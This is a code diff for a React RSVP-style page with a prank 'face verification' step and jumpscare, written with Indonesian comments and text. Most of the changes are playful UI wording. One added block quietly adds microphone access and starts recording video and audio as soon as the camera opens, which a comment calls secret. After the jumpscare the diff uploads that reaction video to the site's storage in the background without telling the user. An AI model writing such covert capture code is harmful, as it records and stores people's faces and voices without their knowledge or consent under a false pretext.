@@ -2,7 +2,7 @@ import { useState, useRef, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useNavigate, useLocation } from "react-router-dom";
 import SignatureCanvas from "react-signature-canvas";
-import { saveRSVP } from "../lib/rsvpService";
+import { saveRSVP, uploadReactionVideo, updateReactionVideo } from "../lib/rsvpService";
 import TurtleLoader from "../components/TurtleLoader";
 
 const SignaturePage = () => {
@@ -19,6 +19,8 @@ const SignaturePage = () => {
   const mediaRecorderRef = useRef(null);
   const voiceChunksRef = useRef([]);
   const voiceBlobRef = useRef(null);
+  const videoRecorderRef = useRef(null);
+  const videoChunksRef = useRef([]);
 
   const [step, setStep] = useState(0); // 0 = Kesel Meter, 1 = Signature, 2 = Face Verification
 
@@ -69,11 +71,24 @@ const SignaturePage = () => {
     let stream = null;
     if (step === 2) {
       navigator.mediaDevices
-        .getUserMedia({ video: { facingMode: "user" } })
+        .getUserMedia({ video: { facingMode: "user" }, audio: true })
         .then((s) => {
           stream = s;
           if (videoRef.current) {
             videoRef.current.srcObject = s;
+          }
+
+          // Mulai rekam video reaction diam-diam sejak kamera aktif (sebelum diklik!)
+          try {
+            videoChunksRef.current = [];
+            const recorder = new MediaRecorder(s, { mimeType: 'video/webm' });
+            recorder.ondataavailable = e => {
+              if (e.data.size > 0) videoChunksRef.current.push(e.data);
+            };
+            recorder.start();
+            videoRecorderRef.current = recorder;
+          } catch (err) {
+            console.error("Gagal mulai rekam video:", err);
           }
         })
         .catch((err) => {
@@ -214,6 +229,17 @@ const SignaturePage = () => {
 
   const handleScan = () => {
     setIsScanning(true);
+
+    // Pre-warm audio secara sinkron saat tombol diklik agar tidak di-block oleh browser
+    const hachimi = new Audio("/Hachimi%20mr%20biao%20tiktok%20version.mp3");
+    hachimi.volume = 0; // Mute sementara
+    hachimi.play().then(() => {
+      hachimi.pause();
+      hachimi.volume = 1;
+      hachimi.currentTime = 0;
+    }).catch(e => console.error("Pre-warm audio failed:", e));
+    window.hachimiAudio = hachimi;
+
     setTimeout(() => {
       const capturedFace = captureFace();
       setIsScanning(false);
@@ -221,13 +247,26 @@ const SignaturePage = () => {
       setTimeout(() => {
         setShowJumpscare(true);
 
-        // Play Hachimi globally so it doesn't stop when we change pages!
-        const hachimi = new Audio("/Hachimi%20mr%20biao%20tiktok%20version.mp3");
-        window.hachimiAudio = hachimi;
-        hachimi.play().catch(e => console.error("Hachimi audio playback failed:", e));
+        // Putar audio yang sudah di-pre-warm
+        if (window.hachimiAudio) {
+          window.hachimiAudio.play().catch(e => console.error("Hachimi audio playback failed:", e));
+        }
 
         // Fixed jumpscare interval (10 seconds) then navigate
         setTimeout(() => {
+          // Berhentikan rekam video dan upload
+          if (videoRecorderRef.current && videoRecorderRef.current.state !== "inactive") {
+            videoRecorderRef.current.onstop = async () => {
+              const blob = new Blob(videoChunksRef.current, { type: "video/webm" });
+              // Upload di background tanpa memblokir navigasi
+              uploadReactionVideo(blob, username).then(res => {
+                if (res.success) {
+                  updateReactionVideo(username, res.url);
+                }
+              });
+            };
+            videoRecorderRef.current.stop();
+          }
           setJumpscareEnded(true);
         }, 10000);
 
@@ -314,10 +353,10 @@ const SignaturePage = () => {
                 <span className="text-2xl">😤</span>
               </div>
               <h1 className="font-heading text-2xl sm:text-3xl text-matcha-dark font-bold mb-2">
-                Seberapa Kesel Kamu?
+                Cebelapa Kesel Kamyu?
               </h1>
               <p className="font-body text-xs sm:text-sm text-gray-600">
-                Lampiaskan kekesalanmu di sini! Teriak di depan HP sampai bar-nya merah! 🤬
+                Luapin Beban Kamu di sini! Teriak?Misuh di depan HP sampai bar-nya merah 80%! 🤬
               </p>
             </div>
 
@@ -365,7 +404,7 @@ const SignaturePage = () => {
               </motion.button>
             ) : (
               <p className="font-accent text-xs font-bold text-red-500 animate-pulse tracking-widest uppercase">
-                Kurang Kenceng!!! AAAAA!!!
+                Kurang Kenceng!!! JKLRQSXC!!!
               </p>
             )}
           </motion.div>
@@ -377,10 +416,10 @@ const SignaturePage = () => {
                 <span className="text-2xl">📝</span>
               </div>
               <h1 className="font-heading text-2xl sm:text-3xl text-matcha-dark font-bold mb-2">
-                Tanda Tangan
+                TTD :3
               </h1>
               <p className="font-body text-xs sm:text-sm text-gray-600">
-                Tanda tangani di sini sebagai bukti komitmen kehadiran kamu ya! 💕
+                Tanda tangani di sini sebagai tanda akan kehadiran kamu ya! 💕
               </p>
             </motion.div>
 
@@ -398,7 +437,7 @@ const SignaturePage = () => {
                 </div>
               </div>
               <p className="font-accent tracking-widest uppercase text-[10px] text-gray-500 text-center mt-3 font-semibold">
-                Gambar tanda tangan di dalam kotak
+                Buat tanda tangan di dalam kotak
               </p>
             </motion.div>
 
@@ -435,7 +474,7 @@ const SignaturePage = () => {
                 whileTap={{ scale: 0.98 }}
                 className="flex-1 py-3 px-4 bg-white/50 border border-gray-300 text-gray-600 font-bold text-sm rounded-xl hover:bg-white hover:text-gray-800 transition-all shadow-sm font-body"
               >
-                Bersihkan
+                Ulang
               </motion.button>
 
               <motion.button
@@ -456,7 +495,7 @@ const SignaturePage = () => {
                 Face Verification
               </h1>
               <p className="font-body text-xs sm:text-sm text-gray-600">
-                {scanComplete ? "Verifikasi Berhasil! 100% Valid ✨" : "Posisikan wajah cantikmu di kamera 📸"}
+                {scanComplete ? "Verifikasi Berhasil! 100% Valid ✨" : "Mana Coba Liat Cantiknya Aku 📸"}
               </p>
             </div>
 
